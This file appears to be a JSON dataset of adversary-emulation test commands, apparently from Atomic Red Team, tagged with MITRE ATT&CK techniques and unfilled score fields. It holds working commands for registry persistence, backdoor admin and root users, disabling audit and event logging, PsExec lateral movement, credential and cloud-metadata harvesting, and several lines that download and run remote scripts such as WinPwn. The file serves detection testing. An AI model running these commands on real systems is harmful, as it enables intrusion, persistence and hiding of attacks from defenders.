        "Command": "Set-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" \"StubPath\" \"C:\\Windows\\System32\\calc.exe\" -Force\n& $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup",
        "Description": "This test will add a StubPath entry to the Active Setup native registry key associated with 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) \nSaid key doesn't have a StubPath value by default, by adding one it will launch calc by forcing to run active setup using runonce.exe /AlternateShellStartup. \nWithout the last command it will normally run on next user logon. Note: this test will only run once successfully if no cleanup command is run in between test.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.014",
        "Shell": "powershell"
    },
    {
        "ID": 751,
        "Command": "Set-ItemProperty -Path \"HKCU:\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\{C9E9A340-D1F1-11D0-821E-444553540600}\" -Name \"Version\" -Value \"0,0,0,0\"\n& $env:SYSTEMROOT\\system32\\runonce.exe /AlternateShellStartup\n",
        "Description": "This test will decrease the version number of the 'Internet Explorer Core Fonts' (UUID {C9E9A340-D1F1-11D0-821E-444553540600}) registry key for the current user, \nwhich will force the StubPath payload (if set) to execute.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.014",
        "Shell": "powershell"
    },
    {
        "ID": 752,
        "Command": "copy \"PathToAtomicsFolder\\T1574.009\\bin\\WindowsServiceExample.exe\" \"C:\\Program Files\\windows_service.exe\"\ncopy \"PathToAtomicsFolder\\T1574.009\\bin\\WindowsServiceExample.exe\" \"C:\\program.exe\"\nsc create \"Example Service\" binpath= \"C:\\Program Files\\windows_service.exe\" Displayname= \"Example Service\" start= auto\nsc start \"Example Service\"\n",
        "Description": "When a service is created whose executable path contains spaces and isn’t enclosed within quotes, leads to a vulnerability\nknown as Unquoted Service Path which allows a user to gain SYSTEM privileges.\nIn this case, if an executable program.exe in C:\\ exists, C:\\program.exe will be executed instead of test.exe in C:\\Program Files\\subfolder\\test.exe.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1574.009",
        "Shell": "command_prompt"
    },
    {
        "ID": 753,
        "Command": "C:\\Windows\\System32\\Curl.exe -k https://ipinfo.io/\n",
        "Description": "Get geolocation info through IP-Lookup services using curl Windows. The default URL of the IP-Lookup service is https://ipinfo.io/. References: https://securelist.com/transparent-tribe-part-1/98127/ and https://news.sophos.com/en-us/2016/05/03/location-based-ransomware-threat-research/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1614",
        "Shell": "command_prompt"
    },
    {
        "ID": 754,
        "Command": "curl -k https://ipinfo.io/\n",
        "Description": "Get geolocation info through IP-Lookup services using curl Windows. The default URL of the IP-Lookup service is https://ipinfo.io/. References: https://securelist.com/transparent-tribe-part-1/98127/ and https://news.sophos.com/en-us/2016/05/03/location-based-ransomware-threat-research/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1614",
        "Shell": "bash"
    },
    {
        "ID": 755,
        "Command": "# Add user32.dll for keybd_event\nAdd-Type @\"\n\\tusing System;\n\\tusing System.Runtime.InteropServices;\n\\tpublic class K {\n\\t\\t[DllImport(\"user32.dll\")]\n\\t\\tpublic static extern void keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);\n\\t}\n\"@\n\n# Virtual key codes\n$VK_LWIN, $VK_R, $KEYDOWN, $KEYUP = 0x5B, 0x52, 0x0000, 0x0002\n\n# Open Run dialog (Win+R)\n[K]::keybd_event($VK_LWIN, 0, $KEYDOWN, [UIntPtr]::Zero)\n[K]::keybd_event($VK_R, 0, $KEYDOWN, [UIntPtr]::Zero)\n[K]::keybd_event($VK_R, 0, $KEYUP, [UIntPtr]::Zero)\n[K]::keybd_event($VK_LWIN, 0, $KEYUP, [UIntPtr]::Zero)\n\n# Short delay for Run dialog\nStart-Sleep -Milliseconds 500\nAdd-Type -AssemblyName System.Windows.Forms\n[System.Windows.Forms.SendKeys]::SendWait(\"cmd /c powershell -ec \" + [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('calc.exe')) + \"{ENTER}\")\n",
        "Description": "Tests the **Paste and Run** technique, where users are tricked into running\nmalicious PowerShell commands by automating the Win+R command to open the\nRun dialog and input `encoded PowerShell to execute calc.exe.`\n\n- [Fake CAPTCHA Campaign](https://medium.com/@ahmed.moh.farou2/fake-captcha-campaign-on-arabic-pirated-movie-sites-delivers-lumma-stealer-4f203f7adabf)\n- [From Clipboard to Compromise](https://www.proofpoint.com/us/blog/threat-insight/clipboard-compromise-powershell-self-pwn)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1566.002",
        "Shell": "powershell"
    },
    {
        "ID": 756,
        "Command": "PathToAtomicsFolder\\T1071\\bin\\telnet_client.exe 127.0.0.1 --port 23\n",
        "Description": "An adversary may establish Telnet communication from a compromised endpoint to a command and control (C2) server in order to carry out additional attacks on objectives.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1071",
        "Shell": "powershell"
    },
    {
        "ID": 757,
        "Command": "C:\\Windows\\System32\\inetsrv\\appcmd.exe set config \"Default Web Site\" /section:httplogging /dontLog:true\n",
        "Description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.002",
        "Shell": "powershell"
    },
    {
        "ID": 758,
        "Command": "set-WebConfigurationProperty -PSPath \"IIS:\\Sites\\Default Web Site\\\" -filter \"system.webServer/httpLogging\" -name dontLog -value $true\n",
        "Description": "Disables HTTP logging on a Windows IIS web server as seen by Threat Group 3390 (Bronze Union).\nThis action requires HTTP logging configurations in IIS to be unlocked.\n\nUse the cleanup commands to restore some default auditpol settings (your original settings will be lost)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.002",
        "Shell": "powershell"
    },
    {
        "ID": 759,
        "Command": "Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned -ErrorAction Ignore\n$url = \"https://raw.githubusercontent.com/hlldz/Invoke-Phant0m/f1396c411a867e1b471ef80c5c534466103440e0/Invoke-Phant0m.ps1\"\n$output = \"$env:TEMP\\Invoke-Phant0m.ps1\"\n$wc = New-Object System.Net.WebClient\n$wc.DownloadFile($url, $output)\ncd $env:TEMP\nImport-Module .\\Invoke-Phant0m.ps1\nInvoke-Phant0m\n",
        "Description": "Kill Windows Event Log Service Threads using Invoke-Phant0m. WARNING you will need to restart PC to return to normal state with Log Service. https://artofpwn.com/phant0m-killing-windows-event-log.html",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.002",
        "Shell": "powershell"
    },
    {
        "ID": 760,
        "Command": "auditpol /set /category:\"Account Logon\" /success:disable /failure:disable\nauditpol /set /category:\"Logon/Logoff\" /success:disable /failure:disable\nauditpol /set /category:\"Detailed Tracking\" /success:disable\n",
        "Description": "Disables the windows audit policy to prevent key host based telemetry being written into the event logs.\n[Solarigate example](https://www.microsoft.com/security/blog/2021/01/20/deep-dive-into-the-solorigate-second-stage-activation-from-sunburst-to-teardrop-and-raindrop/)",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 761,
        "Command": "auditpol /clear /y\nauditpol /remove /allusers\n",
        "Description": "Clear the Windows audit policy using auditpol utility. This action would stop certain audit events from being recorded in the security log.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 762,
        "Command": "wevtutil sl \"Microsoft-Windows-IKE/Operational\" /e:false\n",
        "Description": "Wevtutil can be used to disable logs. \nNOTE: RansomEXX ransomware uses this to disable Security logs post-encryption.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 763,
        "Command": "\"PathToAtomicsFolder\\T1562.002\\bin\\Phant0m.exe\"\n",
        "Description": "Use [Phant0m](https://github.com/hlldz/Phant0m) to disable Eventlog\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 764,
        "Command": "Set-ItemProperty -Path HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\WINEVT\\Channels\\Microsoft-Windows-TaskScheduler/Operational -Name \"ChannelAccess\" -Value \"O:SYG:SYD:(D;;0x1;;;WD)\"\nRestart-Service -Name EventLog -Force -ErrorAction Ignore ",
        "Description": "This test simulates an adversary modifying access permissions for a Windows Event Log Channel by altering the \"ChannelAccess\" registry value. Specifically, it changes the Security Descriptor Definition Language (SDDL) string. These modifications can restrict or grant access to specific users or groups, potentially aiding in defense evasion by controlling who can view or modify a event log channel.\nUpon execution, the user shouldn't be able to access the event log channel via the event viewer or via utilities such as \"Get-EventLog\" or \"wevtutil\".",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.002",
        "Shell": "powershell"
    },
    {
        "ID": 765,
        "Command": "New-Item -Path HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\EventLog\\Setup -Force\nSet-ItemProperty -Path HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\EventLog\\Setup -Name \"ChannelAccess\" -Value \"O:SYG:SYD:(D;;0x1;;;WD)\"\nRestart-Service -Name EventLog -Force -ErrorAction Ignore",
        "Description": "This test simulates an adversary modifying access permissions for a Windows Event Log Channel by altering the \"ChannelAccess\" registry value. Specifically, it changes the Security Descriptor Definition Language (SDDL) string. These modifications can restrict or grant access to specific users or groups, potentially aiding in defense evasion by controlling who can view or modify a event log channel.\nUpon execution, the user shouldn't be able to access the event log channel via the event viewer or via utilities such as \"Get-EventLog\" or \"wevtutil\".",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.002",
        "Shell": "powershell"
    },
    {
        "ID": 766,
        "Command": "Set-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\System -Name \"CustomSD\" -Value \"O:SYG:SYD:(D;;0x1;;;WD)\"",
        "Description": "This test simulates an adversary modifying access permissions for a Windows Event Log channel by setting the \"CustomSD\" registry value. Specifically, it changes the Security Descriptor Definition Language (SDDL) string. These modifications can restrict or grant access to specific users or groups, potentially aiding in defense evasion by controlling who can view or modify a event log channel.\nUpon execution, the user shouldn't be able to access the event log channel via the event viewer or via utilities such as \"Get-EventLog\" or \"wevtutil\".",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1562.002",
        "Shell": "powershell"
    },
    {
        "ID": 767,
        "Command": "useradd -M -N -r -s /bin/bash -c evil_account evil_user\n",
        "Description": "Create a user via useradd\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1136.001",
        "Shell": "bash"
    },
    {
        "ID": 768,
        "Command": "pw useradd evil_user -s /usr/sbin/nologin -d /nonexistent -c evil_account\n",
        "Description": "Create a user via pw\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1136.001",
        "Shell": "sh"
    },
    {
        "ID": 769,
        "Command": "dscl . -create /Users/evil_user\ndscl . -create /Users/evil_user UserShell /bin/zsh\ndscl . -create /Users/evil_user RealName \"Evil Account\"\ndscl . -create /Users/evil_user UniqueID \"1010\"\ndscl . -create /Users/evil_user PrimaryGroupID 80\ndscl . -create /Users/evil_user NFSHomeDirectory /Users/evil_user\n",
        "Description": "Creates a user on a MacOS system with dscl\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1136.001",
        "Shell": "bash"
    },
    {
        "ID": 770,
        "Command": "net user /add \"T1136.001_CMD\" \"T1136.001_CMD!\"\n",
        "Description": "Creates a new user in a command prompt. Upon execution, \"The command completed successfully.\" will be displayed. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_CMD\"\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1136.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 771,
        "Command": "New-LocalUser -Name \"T1136.001_PowerShell\" -NoPassword\n",
        "Description": "Creates a new user in PowerShell. Upon execution, details about the new account will be displayed in the powershell session. To verify the\nnew account, run \"net user\" in powershell or CMD and observe that there is a new user named \"T1136.001_PowerShell\"\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1136.001",
        "Shell": "powershell"
    },
    {
        "ID": 772,
        "Command": "useradd -g 0 -M -d /root -s /bin/bash butter\nif [ $(cat /etc/os-release | grep -i 'Name=\"ubuntu\"') ]; then echo \"butter:BetterWithButter\" | sudo chpasswd; else echo \"BetterWithButter\" | passwd --stdin butter; fi;\n",
        "Description": "Creates a new user in Linux and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1136.001",
        "Shell": "bash"
    },
    {
        "ID": 773,
        "Command": "pw useradd butter -g 0 -d /root -s /bin/sh\necho \"BetterWithButter\" | pw usermod butter -h 0\n",
        "Description": "Creates a new user in FreeBSD and adds the user to the `root` group. This technique was used by adversaries during the Butter attack campaign.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1136.001",
        "Shell": "sh"
    },
    {
        "ID": 774,
        "Command": "net user /add \"T1136.001_Admin\" \"T1136_pass\"\nnet localgroup administrators \"T1136.001_Admin\" /add\n",
        "Description": "Creates a new admin user in a command prompt.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1136.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 775,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/0xv1n/dotnetfun/9b3b0d11d1c156909c0b1823cff3004f80b89b1f/Persistence/CreateNewLocalAdmin_ART.ps1')",
        "Description": "Creates a new admin user in a powershell session without using net.exe\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1136.001",
        "Shell": "powershell"
    },
    {
        "ID": 776,
        "Command": "net stop w32time\nCopy-Item \"$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll\" C:\\Users\\Public\\AtomicTest.dll\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\AtomicTest\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f\nnet start w32time\n",
        "Description": "Establishes persistence by creating a new time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe new time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.003",
        "Shell": "powershell"
    },
    {
        "ID": 777,
        "Command": "net stop w32time\nCopy-Item \"$PathToAtomicsFolder\\T1547.003\\bin\\AtomicTest.dll\" C:\\Users\\Public\\AtomicTest.dll\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_SZ /v \"DllName\" /d \"C:\\Users\\Public\\AtomicTest.dll\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"Enabled\" /d \"1\" /f\nreg add \"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpServer\" /t REG_DWORD /v \"InputProvider\" /d \"1\" /f\nnet start w32time\n",
        "Description": "Establishes persistence by editing the NtpServer time provider registry key under HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\W32Time\\TimeProvider.\nThe time provider will point to a DLL which will be loaded after the w32time service is started. The DLL will then create the file AtomicTest.txt\nin C:\\Users\\Public\\ as validation that the test is successful.\n\nPayload source code: https://github.com/tr4cefl0w/payloads/tree/master/T1547.003/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1547.003",
        "Shell": "powershell"
    },
    {
        "ID": 778,
        "Command": "Get-WMIObject Win32_PnPEntity | Format-Table Name, Description, Manufacturer > $env:TEMP\\T1120_collection.txt\n$Space,$Heading,$Break,$Data = Get-Content $env:TEMP\\T1120_collection.txt\n@($Heading; $Break; $Data |Sort-Object -Unique) | ? {$_.trim() -ne \"\" } |Set-Content $env:TEMP\\T1120_collection.txt",
        "Description": "Perform peripheral device discovery using Get-WMIObject Win32_PnPEntity",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1120",
        "Shell": "powershell"
    },
    {
        "ID": 779,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nprintercheck -noninteractive -consoleoutput",
        "Description": "Search for printers / potential vulns using printercheck function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1120",
        "Shell": "powershell"
    },
    {
        "ID": 780,
        "Command": "fsutil fsinfo drives",
        "Description": "Performs pheripheral device discovery utilizing fsutil to list all drives.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1120",
        "Shell": "command_prompt"
    },
    {
        "ID": 781,
        "Command": "Get-Printer\n",
        "Description": "This test uses PowerShell to list printers on a Windows system, demonstrating a discovery technique attackers might use to \ngather details on connected devices. Using Get-Printer, they can view information on all available printers, identifying \npotential devices for further targeting.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1120",
        "Shell": "powershell"
    },
    {
        "ID": 782,
        "Command": "import-module msonline\n$Password = ConvertTo-SecureString -String \"T1082Az\" -AsPlainText -Force\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"\", $Password\nConnect-MsolService -Credential $Credential\n$users = Get-MsolUser -All;\nforeach($user in $users)\n{$props = @();$user | Get-Member | foreach-object{$props+=$_.Name}; \nforeach($prop in $props)\n{if($user.$prop -like \"*password*\")\n{(\"[*]\" + $user.UserPrincipalName + \"[\" + $prop + \"]\" + \" : \" + $user.$prop) | out-file -filepath $env:temp\\T1552.005Test1.txt -append -force}}}\nget-content -path $env:temp\\T1552.005Test1.txt -erroraction silentlycontinue\n",
        "Description": "This test uses the MSOnline Powershell module to retrieve all user attributes for a specified account, which can sometimes contain unsecured credentials. \nUpon successful execution, this test will scan all user attributes for any strings containing \"password\".\nThose unsecured credentials will be output to a text file, as well as the account that they are associated with and the user attribute in which they were found. \nSee: https://github.com/dafthack/CloudPentestCheatsheets/blob/master/cheatsheets/Azure.md\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.005",
        "Shell": "powershell"
    },
    {
        "ID": 783,
        "Command": "Invoke-RestMethod -Headers @{\"Metadata\"=\"true\"} -Method GET -Uri \"http://169.254.169.254/metadata/instance?api-version=2021-02-01\" | ConvertTo-Json -Depth 64 > $env:temp\\T1552.005Test2.txt\n",
        "Description": "This test invokes a web request to the default Instance Metadata API of 169.254.169.254 in order to dump the data contained within it to a file. \nSee: https://www.sans.org/blog/cloud-instance-metadata-services-imds-/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1552.005",
        "Shell": "powershell"
    },
    {
        "ID": 784,
        "Command": "sc.exe create ARTService binPath= \"%COMSPEC% /c powershell.exe -nop -w hidden -command New-Item -ItemType File C:\\art-marker.txt\"\nsc.exe start ARTService\nsc.exe delete ARTService\n",
        "Description": "Creates a service specifying an arbitrary command and executes it. When executing commands such as PowerShell, the service will report that it did not start correctly even when code executes properly.\n\nUpon successful execution, cmd.exe creates a new service using sc.exe that will start powershell.exe to create a new file `art-marker.txt`\n\n[BlackCat Ransomware (ALPHV)](https://www.varonis.com/blog/blackcat-ransomware)  \n[Cybereason vs. BlackCat Ransomware](https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware)\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1569.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 785,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" \\\\localhost -i -u DOMAIN\\Administrator -p P@ssw0rd1 -accepteula \"C:\\Windows\\System32\\calc.exe\"\n",
        "Description": "Requires having Sysinternals installed, path to sysinternals is one of the input input_arguments\nWill start a process on a remote host.\n\nUpon successful execution, cmd will utilize psexec.exe to spawn calc.exe on a remote endpoint (default:localhost).\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1569.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 786,
        "Command": "psexec.py '/Administrator:P@ssw0rd1@127.0.0.1' 'whoami'\n",
        "Description": "Will execute a command on the remote host with Impacket psexec.py script.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1569.002",
        "Shell": "bash"
    },
    {
        "ID": 787,
        "Command": "cmd.exe /c \"wmic \\tcsproduct \\tget UUID\" \ncmd.exe /c \"fsutil behavior \\tset SymlinkEvaluation R2L:1\" \ncmd.exe /c \"fsutil behavior set \\tSymlinkEvaluation R2R:1\"\nreg\\tadd\\tHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\Parameters\\t/v MaxMpxCt /d 65535 /t REG_DWORD /f\\t  \ncopy \"PathToAtomicsFolder\\..\\ExternalPayloads\\PsExec.exe\" $env:temp\ncmd.exe /c \"$env:temp\\psexec.exe  -accepteula  \\\\$ENV:COMPUTERNAME cmd.exe  /c echo \"--access-token\"\"\n",
        "Description": "This atomic attempts to emulate the unique behavior of BlackCat ransomware prior to encryption and during Lateral Movement attempts via PsExec on Windows. Uses bundled PsExec like BlackCat",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1569.002",
        "Shell": "powershell"
    },
    {
        "ID": 788,
        "Command": "\"PathToAtomicsFolder\\..\\ExternalPayloads\\remcom.exe\" \\\\localhost /user:Administrator /pwd:P@ssw0rd1 cmd.exe\n",
        "Description": "Requires having RemCom installed, path to RemCom is one of the input input_arguments\nWill start a process on a remote host.\nUpon successful execution, cmd will utilize RemCom.exe to spawn calc.exe on a remote endpoint (default:localhost).\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1569.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 789,
        "Command": "sc.exe create \"WerFaultSvc\" binPath= \"$env:windir\\WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe\" DisplayName= \"WerFault Service\" start= auto\n",
        "Description": "The following Atomic Test will create a new service named WerFaultSvc with a binary path of WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe.\nThis was recently seen in the Snake Malware report. \nUpon execution, sc.exe will create a new service named WerFaultSvc with a bin path \\WinSxS\\x86_microsoft-windows-errorreportingfaults_31bf3856ad364e35_4.0.9600.16384_none_a13f7e283339a050\\WerFault.exe and a display name of WerFault Service.\n[Snake Malware - CISA](https://media.defense.gov/2023/May/09/2003218554/-1/-1/0/JOINT_CSA_HUNTING_RU_INTEL_SNAKE_MALWARE_20230509.PDF)  \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1569.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 790,
        "Command": "sc.exe sdset scmanager D:(A;;KA;;;WD)\n",
        "Description": "Modify permissions of Service Control Manager via SDSET. This allows any administrative user to escalate privilege and create a service with SYSTEM level privileges.Restart is required.\n[Blog](https://0xv1n.github.io/posts/scmanager/)  \n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1569.002",
        "Shell": "command_prompt"
    },
    {
        "ID": 791,
        "Command": "cd C:\\Users\\Public\\Temp\\ \n.\\PsExec.exe -i -s cmd  -accepteula",
        "Description": "Requires PsExec tool installed. BlackCat Ransomeware tried to propagate by creating pipe using PsExec process executing from suspicious locations (In the particular case the legitimate PsExec executable is embedded within the Windows variant and is dropped in the victim’s %TEMP% directory). pon successful execution, PsExec will be executed from suspicious location and create a new pipe to execute CMD.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1569.002",
        "Shell": "powershell"
    },
    {
        "ID": 792,
        "Command": "reg query \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Internet Explorer\" /v svcVersion\n",
        "Description": "Query the registry to determine the version of internet explorer installed on the system.\nUpon execution, version information about internet explorer will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1518",
        "Shell": "command_prompt"
    },
    {
        "ID": 793,
        "Command": "Get-ItemProperty HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\nGet-ItemProperty HKLM:\\Software\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table -Autosize\n",
        "Description": "Query the registry to determine software and versions installed on the system. Upon execution a table of\nsoftware name and version information will be displayed.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1518",
        "Shell": "powershell"
    },
    {
        "ID": 794,
        "Command": "/usr/libexec/PlistBuddy -c \"print :CFBundleShortVersionString\" /Applications/Safari.app/Contents/Info.plist\n/usr/libexec/PlistBuddy -c \"print :CFBundleVersion\" /Applications/Safari.app/Contents/Info.plist\n",
        "Description": "Adversaries may attempt to get a listing of non-security related software that is installed on the system. Adversaries may use the information from Software Discovery during automated discovery to shape follow-on behaviors\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1518",
        "Shell": "sh"
    },
    {
        "ID": 795,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\nDotnetsearch -noninteractive -consoleoutput",
        "Description": "Search for any .NET binary file in a share using the Dotnetsearch function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1518",
        "Shell": "powershell"
    },
    {
        "ID": 796,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\ndotnet -consoleoutput -noninteractive",
        "Description": "Search for .NET Service-Binaries on this system via winpwn dotnet function of WinPwn.",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1518",
        "Shell": "powershell"
    },
    {
        "ID": 797,
        "Command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')\npowerSQL -noninteractive -consoleoutput",
        "Description": "Start PowerUpSQL Checks using powerSQL function of WinPwn",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1518",
        "Shell": "powershell"
    },
    {
        "ID": 798,
        "Command": "Invoke-WebRequest www.google.com -UserAgent \"HttpBrowser/1.0\" | out-null\nInvoke-WebRequest www.google.com -UserAgent \"Wget/1.9+cvs-stable (Red Hat modified)\" | out-null\nInvoke-WebRequest www.google.com -UserAgent \"Opera/8.81 (Windows NT 6.0; U; en)\" | out-null\nInvoke-WebRequest www.google.com -UserAgent \"*<|>*\" | out-null\n",
        "Description": "This test simulates an infected host beaconing to command and control. Upon execution, no output will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1071.001",
        "Shell": "powershell"
    },
    {
        "ID": 799,
        "Command": "C:\\Windows\\System32\\Curl.exe -s -A \"HttpBrowser/1.0\" -m3 www.google.com >nul 2>&1\nC:\\Windows\\System32\\Curl.exe -s -A \"Wget/1.9+cvs-stable (Red Hat modified)\" -m3 www.google.com >nul 2>&1\nC:\\Windows\\System32\\Curl.exe -s -A \"Opera/8.81 (Windows NT 6.0; U; en)\" -m3 www.google.com >nul 2>&1\nC:\\Windows\\System32\\Curl.exe -s -A \"*<|>*\" -m3 www.google.com >nul 2>&1\n",
        "Description": "This test simulates an infected host beaconing to command and control. Upon execution, no out put will be displayed. \nUse an application such as Wireshark to record the session and observe user agent strings and responses.\n\nInspired by APTSimulator - https://github.com/NextronSystems/APTSimulator/blob/master/test-sets/command-and-control/malicious-user-agents.bat\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1071.001",
        "Shell": "command_prompt"
    },
    {
        "ID": 800,
